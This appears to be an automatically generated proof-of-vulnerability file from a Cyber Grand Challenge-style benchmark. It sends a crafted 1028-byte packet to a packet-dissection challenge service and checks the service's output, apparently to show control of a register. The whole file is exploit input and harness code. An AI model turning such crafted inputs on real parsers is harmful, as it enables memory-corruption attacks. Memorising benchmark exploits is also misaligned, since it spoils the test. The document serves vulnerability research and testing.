#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x3a\xb7\xac\xe1"
         "\xc1\x23\x5b\x27\x18\xda\x53\xe2\x1a\x01\x00\x00\x68\xa3\xda\x29"
         "\x5a\x00\x8f\x0d\xd8\x0f\xea\xc2\x13\xa2\x65\x1c\x4c\x86\x5a\xb9"
         "\x54\x01\xe3\x5a\x00\x5a\x00\x8e\xc6\xa8\xbd\xc2\x45\x0e\xfd\xab"
         "\xab\xb8\xad\x0a\xa1\xa2\x98\x1f\xe9\x98\x42\xa2\x87\x69\x25\x19"
         "\x9d\xa3\xcb\x85\x78\x48\xbc\x41\x2c\xc3\x28\x79\x79\x87\xe0\x4a"
         "\x15\xeb\x0d\x31\xb0\xd7\x04\x50\x67\x80\x62\xa6\x6f\xb0\xa3\x8e"
         "\x6c\xe6\xba\xf0\xdd\x9f\xe0\x7a\x6e\x4b\x99\x06\x37\xe4\x2b\x22"
         "\x59\x42\x45\x9a\x31\x22\x54\x1b\x62\x68\x19\x76\x52\x26\x63\xd0"
         "\xb5\xed\xc7\x60\x58\xbd\xc5\xd7\xfd\x58\xe4\xc6\xf8\xa7\xca\x47"
         "\xcc\x3b\xe6\x82\xb2\x3d\x75\x05\xb4\xc7\x4f\x59\x47\x2f\x5a\x59"
         "\x7d\xd3\x57\x21\x93\x88\x16\x1b\xda\xbd\x2b\x15\xcc\xeb\x8a\xd5"
         "\xc7\xb9\xc1\x0a\x14\xf8\xf8\xf1\xbe\x33\x75\x16\x3b\x6f\x42\x79"
         "\x3b\x19\x27\x92\xed\x5a\x89\x9d\x58\x7f\x7a\x96\x95\x1c\x30\xb6"
         "\x64\x43\xfd\xb5\x40\x4f\xc4\xd8\x9d\x4f\x0d\x12\x14\xb3\xf1\xba"
         "\xf0\xfd\xcf\x65\x1b\x1e\x20\x34\x1c\x7c\x9e\x34\x62\xa7\xc3\xad"
         "\xee\x7c\x06\x15\x03\xed\x5c\x7f\xd0\xd1\x27\x9f\x5b\x32\x55\x67"
         "\x88\x06\x40\x7d\xc5\xf4\x5c\x1f\x58\x2b\xd8\xc3\x09\x8b\x6f\xab"
         "\xb4\x31\xc6\x66\xf2\x99\x94\x9f\xec\x46\xca\xa2\xcf\x30\x4f\xc8"
         "\x27\x57\xf7\xfd\x17\x9f\x05\xa7\x07\x75\x0a\x9a\x1d\x4e\x3e\xcd"
         "\x28\x93\xde\xad\x0b\x38\xdb\x61\x6d\x0f\x94\x0c\x3a\x21\xa7\x1a"
         "\xaf\x4f\xec\xff\x5d\x54\x53\x0f\x46\x9b\x90\x1c\x77\x34\x40\xc2"
         "\x80\x41\x42\xb1\x65\x56\x11\xec\xef\x11\xc8\x24\x34\x9b\xac\x08"
         "\x18\xeb\x5c\x37\xe2\x43\x5e\x82\x79\x34\x27\x02\x3e\x9c\xe7\xc5"
         "\x42\xc4\xbd\x91\x6f\xa6\xc2\x30\x04\xf8\x3e\x77\x82\xa2\x96\x4b"
         "\x63\x94\x7a\x30\x44\x97\x6f\x8d\x1e\xfa\x91\x58\xeb\xf5\x77\xda"
         "\xa0\x1a\xcd\x82\x20\x98\xe7\x9c\x8b\x1a\x67\xb0\x20\xc9\xc1\xc9"
         "\xec\xc2\x69\x57\x0a\x97\x78\xa7\xcf\x91\xca\x2a\x31\xcc\xce\x32"
         "\x88\xba\xbc\xfa\x7e\x06\x13\x6b\x1b\xdc\xa7\x32\x2e\x2b\xe3\x0e"
         "\xaf\xcc\x6f\x33\xd8\xa6\x5a\xad\x51\x43\x6f\x04\x1d\x14\x7b\x40"
         "\x6b\x8c\x4c\x38\x5a\x00\x9c\x0c\xe7\xcf\xf6\x57\xff\xba\x9e\x7d"
         "\xad\xe2\x59\xf8\xf2\xd2\xe6\xa1\x70\x99\xf1\x12\x5b\x6f\xfb\xec"
         "\x6f\x68\x3d\x4e\x3a\x6f\x8d\xb2\x6a\x6e\xff\xe9\x40\xf9\x1a\xe6"
         "\x5f\xd2\xf1\xfb\xd3\x48\x1e\x23\x0f\xc7\x2c\x60\xd2\xc1\x2f\x5a"
         "\xf1\xd8\xf5\xc6\xa6\x44\xd5\x82\x3c\x3c\x87\xd0\xf3\x78\xc5\x4f"
         "\x75\xc9\x7a\xd3\xf3\xbf\xaf\x4e\x57\x7c\x90\xae\x1c\x3d\xc0\xba"
         "\x64\x07\x51\x50\x04\x88\xae\x9c\xde\xe6\xd0\xfa\x8e\x3f\xbd\xb3"
         "\xad\x66\xbf\x39\x2e\x7c\x7b\xb8\x8c\xb7\x57\xba\x4e\x89\x0c\x01"
         "\xa4\xc7\x45\x14\x4b\xc2\xbe\xab\x20\x98\x98\x11\x92\xdf\xeb\x1a"
         "\x9a\xdb\x89\x2f\x05\x41\xe6\x35\x28\x80\xea\x72\x75\x03\xe8\x84"
         "\x91\x41\x2d\x64\x5d\x7b\x97\x87\x53\xd4\x61\xd8\x7b\xcf\xe1\xd6"
         "\x31\xd2\x97\xc8\xa7\x86\xda\xb1\xd7\x24\x0b\x4e\x88\xfd\x3a\xc8"
         "\x4d\x3b\x04\x5b\x02\x63\x45\x62\x9c\xef\x7d\x9a\xfa\x38\xd6\x93"
         "\xe3\xbc\x6b\x9d\x13\x17\x1a\xa3\x7a\x9b\xb8\xcd\x68\xef\x9b\x7b"
         "\x1b\xa7\x06\x67\x2c\xa6\xd2\x2f\xc2\xcc\xb8\xd5\x89\x35\x49\x88"
         "\x1a\xa8\x38\x71\x8c\x87\xb1\xbd\x33\x24\x99\x13\xda\xf6\xec\xe9"
         "\xcc\x29\xf8\x22\x8c\x51\x62\x81\x4e\xc2\x22\x7e\x71\x11\x1d\xb3"
         "\x44\xb4\x80\x25\xba\x76\x10\x30\xd2\x89\x09\x5d\x2e\x99\x57\xa8"
         "\x36\x94\xac\x16\x43\x08\x89\x96\x04\x37\x8e\x5d\xd0\x09\x94\x48"
         "\x1d\xf3\xea\x64\x44\xe9\x9c\x6f\xc8\xd3\xf2\x60\x62\x68\x1e\xb2"
         "\x5e\xcc\xea\xf3\xc2\x94\xda\x3f\xf7\xd0\x7e\xe6\xc9\xae\x51\x58"
         "\xbc\xdb\x18\x47\xee\xdf\x81\x58\x2c\xbe\x48\xbb\xeb\x61\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===acclaimerilluminability
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x61\x63\x63\x6c\x61\x69\x6d\x65\x72\x69\x6c"
         "\x6c\x75\x6d\x69\x6e\x61\x62\x69\x6c\x69\x74\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
